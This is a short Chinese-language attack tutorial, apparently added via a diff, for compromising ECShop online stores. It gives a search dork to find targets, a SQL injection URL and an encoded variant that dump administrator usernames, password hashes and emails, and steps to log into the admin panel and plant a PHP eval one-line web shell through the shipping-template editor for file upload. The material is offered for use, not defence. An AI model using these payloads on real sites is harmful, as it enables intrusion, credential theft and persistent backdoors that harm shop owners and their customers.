@@ -1,0 +1,11 @@
+关键字：powered by ecshop
+ 
+普通代码：user.php?act=order_query&order_sn=' union select 1，2，3，4，5，6，concat(user_name，0x7c，password，0x7c，email)，8 from ecs_admin_user/*
+ 
+变种代码：search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319
+
+直接在网站后台加入代码回车就能爆出帐号密码，再去掉代码加上/admin回车就能直接进后台了。
+ 
+拿shell方法很简单，找到“库项目管理”再选择“配送的方式”，在代码最下面插入php一句话木马：<?php eval($_POST[x]);?> 不行就换php木马的预代码！
+
+接着保存，一句话路径是：http://www.xxx.org/myship.php  打开“ASP+PHP两用Shell.html”填入地址，点击一下环境变量，成功之后点击上传文件就可以拿shell了。
